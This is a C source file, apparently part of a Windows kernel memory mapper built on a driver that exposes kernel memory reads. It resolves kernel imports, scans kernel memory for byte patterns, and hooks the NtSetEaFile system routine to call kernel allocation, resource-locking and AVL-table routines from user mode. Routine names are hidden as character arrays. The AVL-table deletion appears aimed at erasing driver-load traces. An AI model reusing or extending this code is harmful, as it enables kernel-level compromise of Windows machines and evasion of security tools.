#include "main.h"

NTSTATUS MiResolveImportTable(IN OUT PKERNEL_IMPORT_TABLE Table)
{
#define RESOLVE_IMPORT_TABLE(Address)                                             \
    Table->##Address = NULL;                                                      \
    {                                                                             \
        *(PVOID*)(&Table->##Address) = (PVOID)GetSystemRoutineAddressA(#Address); \
        if (Table->##Address == NULL) {                                           \
            DEBUG_PRINT("[!] Procedure %hs not found.", #Address);                \
            return STATUS_PROCEDURE_NOT_FOUND;                                    \
        }                                                                         \
    }

    RtlSecureZeroMemory(Table, sizeof(KERNEL_IMPORT_TABLE));
    RESOLVE_IMPORT_TABLE(PsLoadedModuleList);
    RESOLVE_IMPORT_TABLE(PsInitialSystemProcess);

    RESOLVE_IMPORT_TABLE(ExAcquireResourceExclusiveLite);
    RESOLVE_IMPORT_TABLE(ExAllocatePool2);
    RESOLVE_IMPORT_TABLE(ExFreePoolWithTag);
    RESOLVE_IMPORT_TABLE(ExReleaseResourceLite);
    RESOLVE_IMPORT_TABLE(IoAllocateMdl);
    RESOLVE_IMPORT_TABLE(IoFreeMdl);
    RESOLVE_IMPORT_TABLE(KeDelayExecutionThread);
    RESOLVE_IMPORT_TABLE(KeSetEvent);
    RESOLVE_IMPORT_TABLE(KeWaitForSingleObject);
    RESOLVE_IMPORT_TABLE(memcpy);
    RESOLVE_IMPORT_TABLE(memset);
    RESOLVE_IMPORT_TABLE(MmAllocatePagesForMdlEx);
    RESOLVE_IMPORT_TABLE(MmCopyMemory);
    RESOLVE_IMPORT_TABLE(MmFreePagesFromMdl);
    RESOLVE_IMPORT_TABLE(MmGetSystemRoutineAddress);
    RESOLVE_IMPORT_TABLE(MmMapIoSpaceEx);
    RESOLVE_IMPORT_TABLE(MmMapLockedPagesSpecifyCache);
    RESOLVE_IMPORT_TABLE(MmMapViewInSystemSpace);
    RESOLVE_IMPORT_TABLE(MmProbeAndLockPages);
    RESOLVE_IMPORT_TABLE(MmProtectMdlSystemAddress);
    RESOLVE_IMPORT_TABLE(MmUnlockPages);
    RESOLVE_IMPORT_TABLE(MmUnmapIoSpace);
    RESOLVE_IMPORT_TABLE(MmUnmapLockedPages);
    RESOLVE_IMPORT_TABLE(MmUnmapViewInSystemSpace);
    RESOLVE_IMPORT_TABLE(ObfDereferenceObject);
    RESOLVE_IMPORT_TABLE(ObReferenceObjectByHandle);
    RESOLVE_IMPORT_TABLE(PsCreateSystemThread);
    RESOLVE_IMPORT_TABLE(PsGetThreadExitStatus);
    RESOLVE_IMPORT_TABLE(PsLookupProcessByProcessId);
    RESOLVE_IMPORT_TABLE(PsTerminateSystemThread);
    RESOLVE_IMPORT_TABLE(RtlAnsiStringToUnicodeString);
    RESOLVE_IMPORT_TABLE(RtlDeleteElementGenericTableAvl);
    RESOLVE_IMPORT_TABLE(RtlEqualUnicodeString);
    RESOLVE_IMPORT_TABLE(RtlFindExportedRoutineByName);
    RESOLVE_IMPORT_TABLE(RtlFreeUnicodeString);
    RESOLVE_IMPORT_TABLE(RtlImageDirectoryEntryToData);
    RESOLVE_IMPORT_TABLE(RtlImageNtHeader);
    RESOLVE_IMPORT_TABLE(RtlInitAnsiString);
    RESOLVE_IMPORT_TABLE(RtlInitUnicodeString);
    RESOLVE_IMPORT_TABLE(RtlLookupElementGenericTableAvl);
    RESOLVE_IMPORT_TABLE(ZwClose);
    RESOLVE_IMPORT_TABLE(ZwCreateSection);
    RESOLVE_IMPORT_TABLE(ZwOpenEvent);
    RESOLVE_IMPORT_TABLE(ZwOpenFile);

#undef RESOLVE_IMPORT_TABLE
    return STATUS_SUCCESS;
}

// ========================================================================================================
//
// ========================================================================================================

PVOID MiFindPattern(
    _In_reads_bytes_(Length) PVOID BaseAddress,
    _In_ SIZE_T Length,
    _In_ PUCHAR Pattern,
    _In_ PCHAR Mask)
{
    ANSI_STRING v1;
    PVOID v2;
    BOOLEAN v3;
    SIZE_T i;
    PUCHAR v4;
    SIZE_T j;

    v2 = NULL;
    RtlInitString(&v1, Mask);
    for (j = 0; j < (Length - v1.Length); j += 1) {
        v3 = TRUE;
        v4 = (PUCHAR)BaseAddress + j;

        for (i = 0; i < v1.Length; i += 1) {
            if (v1.Buffer[i] == 'x' && Pattern[i] != v4[i]) {
                v3 = FALSE;
                break;
            }
        }

        if (v3 == TRUE) {
            v2 = (PVOID)((PCHAR)BaseAddress + j);
            break;
        }
    }
    return v2;
}

PVOID KiFindPattern(
    _In_ PDEVICE_DRIVER_OBJECT Driver,
    _In_ PVOID BaseAddress,
    _In_ SIZE_T Length,
    _In_ PUCHAR Pattern,
    _In_ PCHAR Mask)
{
    ULONGLONG v1 = 0;
    PVOID v2     = RtlAllocateMemory(Length);

    if NT_SUCCESS (Driver->ReadMemory(Driver->DeviceHandle, (ULONGLONG)BaseAddress, v2, Length)) {
        v1 = (ULONGLONG)MiFindPattern(v2, Length, Pattern, Mask);

        if (v1 != 0) {
            v1 -= (ULONGLONG)v2;
            v1 += (ULONGLONG)BaseAddress;
        }

        RtlFreeMemory(v2);
    }

    return (PVOID)v1;
}

PVOID KiRelativeVirtualAddress(
    _In_ PDEVICE_DRIVER_OBJECT Driver,
    _In_ PVOID Address,
    _In_ LONG Offsets,
    _In_ SIZE_T Size)
{
    LONG VA        = 0;
    PVOID Resolved = 0;

    if NT_SUCCESS (Driver->ReadMemory(
                       Driver->DeviceHandle,
                       (ULONGLONG)Address + Offsets,
                       &VA,
                       sizeof(LONG))) {
        Resolved = (PVOID)((ULONGLONG)Address + Size + VA);
    }

    return Resolved;
}

// ========================================================================================================
//
// ========================================================================================================

NTSTATUS KiExAllocatePool2(
    _In_ PDEVICE_DRIVER_OBJECT Driver,
    _In_ SIZE_T NumberOfBytes,
    _Out_ PULONGLONG Pointer)
{
    NTSTATUS Status;
    ULONGLONG Address;
    UCHAR Storage[12];

    *Pointer = 0;
    // clang-format off
    WCHAR v1[] = { L'E', L'x', L'A', L'l', L'l', L'o', L'c', L'a', L't', L'e', L'P', L'o', L'o', L'l', L'2', L'\0' };
    // clang-format on

    Status = MmGetSystemRoutineAddressW(v1, &Address);
    if NT_ERROR (Status) {
        DEBUG_PRINT_NTSTATUS(Status);
        return Status;
    }

    Status = HookSystemRoutine(Driver, Address, Storage);
    if NT_ERROR (Status) {
        DEBUG_PRINT_NTSTATUS(Status);
        return Status;
    }

    typedef ULONGLONG (*ROUTINE_TYPE)(ULONGLONG, SIZE_T, ULONG);
    *Pointer = ((ROUTINE_TYPE)NtSetEaFile)(
        0x0000000000000080UI64,
        NumberOfBytes,
        HandleToUlong(NtCurrentTeb()->ClientId.UniqueThread));

    UnhookSystemRoutine(Driver, Storage);
    return Status;
}

NTSTATUS KiExFreePool(_In_ PDEVICE_DRIVER_OBJECT Driver, _In_ ULONGLONG Pointer)
{
    NTSTATUS Status;
    ULONGLONG Address;
    UCHAR Storage[12];

    // clang-format off
    WCHAR v1[] = { L'E', L'x', L'F', L'r', L'e', L'e', L'P', L'o', L'o', L'l', L'W', L'i', L't', L'h', L'T', L'a', L'g', L'\0' };
    // clang-format on

    Status = MmGetSystemRoutineAddressW(v1, &Address);
    if NT_ERROR (Status) {
        DEBUG_PRINT_NTSTATUS(Status);
        return Status;
    }

    Status = HookSystemRoutine(Driver, Address, Storage);
    if NT_ERROR (Status) {
        DEBUG_PRINT_NTSTATUS(Status);
        return Status;
    }

    typedef VOID (*ROUTINE_TYPE)(ULONGLONG, ULONG);
    ((ROUTINE_TYPE)NtSetEaFile)(Pointer, 0);

    UnhookSystemRoutine(Driver, Storage);
    return Status;
}

NTSTATUS KiExReleaseResourceLite(_In_ PDEVICE_DRIVER_OBJECT Driver, _In_ PVOID Resource)
{
    NTSTATUS Status;
    ULONGLONG Address;
    UCHAR Storage[12];

    // clang-format off
    WCHAR v1[] = { L'E', L'x', L'R', L'e', L'l', L'e', L'a', L's', L'e', L'R', L'e', L's', L'o', L'u', L'r', L'c', L'e', L'L', L'i', L't', L'e', L'\0' };
    // clang-format on

    Status = MmGetSystemRoutineAddressW(v1, &Address);
    if NT_ERROR (Status) {
        DEBUG_PRINT_NTSTATUS(Status);
        return Status;
    }

    Status = HookSystemRoutine(Driver, Address, Storage);
    if NT_ERROR (Status) {
        DEBUG_PRINT_NTSTATUS(Status);
        return Status;
    }

    typedef VOID (*ROUTINE_TYPE)(PVOID);
    ((ROUTINE_TYPE)NtSetEaFile)(Resource);

    UnhookSystemRoutine(Driver, Storage);
    return Status;
}

NTSTATUS KiExAcquireResourceExclusiveLite(
    _In_ PDEVICE_DRIVER_OBJECT Driver,
    _In_ PVOID Resource,
    _In_ BOOLEAN Wait)
{
    NTSTATUS Status;
    ULONGLONG Address;
    UCHAR Storage[12];

    WCHAR v1[] = {L'E', L'x', L'A', L'c', L'q', L'u', L'i', L'r', L'e', L'R', L'e',
                  L's', L'o', L'u', L'r', L'c', L'e', L'E', L'x', L'c', L'l', L'u',
                  L's', L'i', L'v', L'e', L'L', L'i', L't', L'e', L'\0'};

    Status = MmGetSystemRoutineAddressW(v1, &Address);
    if NT_ERROR (Status) {
        DEBUG_PRINT_NTSTATUS(Status);
        return Status;
    }

    Status = HookSystemRoutine(Driver, Address, Storage);
    if NT_ERROR (Status) {
        DEBUG_PRINT_NTSTATUS(Status);
        return Status;
    }

    typedef BOOLEAN (*ROUTINE_TYPE)(_In_ PVOID Resource, _In_ BOOLEAN Wait);
    Status = ((ROUTINE_TYPE)NtSetEaFile)(Resource, Wait) == TRUE ? STATUS_SUCCESS :
                                                                   STATUS_UNSUCCESSFUL;

    UnhookSystemRoutine(Driver, Storage);
    return Status;
}

NTSTATUS KiRtlDeleteElementGenericTableAvl(
    _In_ PDEVICE_DRIVER_OBJECT Driver,
    _In_ PRTL_AVL_TABLE Table,
    _In_ PVOID Buffer)
{
    NTSTATUS Status;
    ULONGLONG Address;
    UCHAR Storage[12];

    WCHAR v1[] = {L'R', L't', L'l', L'D', L'e', L'l', L'e', L't', L'e', L'E', L'l',
                  L'e', L'm', L'e', L'n', L't', L'G', L'e', L'n', L'e', L'r', L'i',
                  L'c', L'T', L'a', L'b', L'l', L'e', L'A', L'v', L'l', L'\0'};

    Status = MmGetSystemRoutineAddressW(v1, &Address);
    if NT_ERROR (Status) {
        DEBUG_PRINT_NTSTATUS(Status);
        return Status;
    }

    Status = HookSystemRoutine(Driver, Address, Storage);
    if NT_ERROR (Status) {
        DEBUG_PRINT_NTSTATUS(Status);
        return Status;
    }

    typedef BOOLEAN (*ROUTINE_TYPE)(_In_ PRTL_AVL_TABLE Table, _In_ PVOID Buffer);
    Status
        = ((ROUTINE_TYPE)NtSetEaFile)(Table, Buffer) == TRUE ? STATUS_SUCCESS : STATUS_UNSUCCESSFUL;

    UnhookSystemRoutine(Driver, Storage);
    return Status;
}

NTSTATUS KiRtlLookupElementGenericTableAvl(
    _In_ PDEVICE_DRIVER_OBJECT Driver,
    _In_ PRTL_AVL_TABLE Table,
    _In_ PVOID Buffer,
    _Out_ PVOID* Pointer)
{
    NTSTATUS Status;
    ULONGLONG Address;
    UCHAR Storage[12];

    *Pointer = 0;

    WCHAR v1[] = {L'R', L't', L'l', L'L', L'o', L'o', L'k', L'u', L'p', L'E', L'l',
                  L'e', L'm', L'e', L'n', L't', L'G', L'e', L'n', L'e', L'r', L'i',
                  L'c', L'T', L'a', L'b', L'l', L'e', L'A', L'v', L'l', L'\0'};

    Status = MmGetSystemRoutineAddressW(v1, &Address);
    if NT_ERROR (Status) {
        DEBUG_PRINT_NTSTATUS(Status);
        return Status;
    }

    Status = HookSystemRoutine(Driver, Address, Storage);
    if NT_ERROR (Status) {
        DEBUG_PRINT_NTSTATUS(Status);
        return Status;
    }

    typedef PVOID (*ROUTINE_TYPE)(_In_ PRTL_AVL_TABLE Table, _In_ PVOID Buffer);
    *Pointer = ((ROUTINE_TYPE)NtSetEaFile)(Table, Buffer);

    UnhookSystemRoutine(Driver, Storage);
    return Status;
}
